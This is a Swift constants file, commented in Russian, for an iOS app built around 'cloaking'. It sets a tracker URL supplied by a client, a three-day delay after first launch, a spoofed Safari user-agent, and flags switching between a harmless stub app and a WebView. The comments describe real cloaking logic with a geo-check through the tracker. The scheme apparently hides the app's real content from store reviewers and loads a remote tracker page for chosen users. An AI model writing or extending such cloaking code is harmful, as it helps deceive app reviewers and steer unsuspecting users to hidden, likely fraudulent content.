import Foundation

struct CloakingConstants {
    // URL трекера от заказчика
    static let trackerURL = "https://zhenazanag.pro/7L7RRMSF"
    
    // Настройки времени
    static let initialDelayDays = 3
    static let requestTimeoutSeconds: TimeInterval = 15.0  // Увеличено до 15 сек
    static let maxLoadingTimeSeconds: TimeInterval = 20.0
    
    // Ключи для UserDefaults
    static let firstLaunchDateKey = "first_launch_date"
    static let lastCheckDateKey = "last_check_date"
    
    // HTTP заголовки для имитации реального браузера
    static let userAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
    static let acceptHeader = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    static let acceptLanguageHeader = "ru-RU,ru;q=0.9,en;q=0.8"
    
    // MARK: - Debug и Testing настройки
    // 🚀 БОЕВОЙ РЕЖИМ: Все DEBUG настройки отключены
    #if DEBUG
    static var isTestMode = false    // 🚀 БОЕВОЙ: Тестовый режим отключен
    static var forceWebView = false  // 🚀 БОЕВОЙ: Используем реальную логику клоакинга
    static var forceStubApp = false  // 🚀 БОЕВОЙ: Используем реальную логику клоакинга
    static var mockDelayDays = -1    // 🚀 БОЕВОЙ: Используем реальные дни (отключен мок)
    static var skipLoadingDelay = false // 🚀 БОЕВОЙ: Показываем загрузку
    static var treatTimeoutAsSuccess = true // При timeout показывать WebView (трекер работает частично)
    #endif
    
    // MARK: - Production Settings (для продакшн сборки)
    // В продакшн все #if DEBUG блоки автоматически отключаются
    // Работает реальная логика: 3 дня задержка + гео-проверка через трекер
} 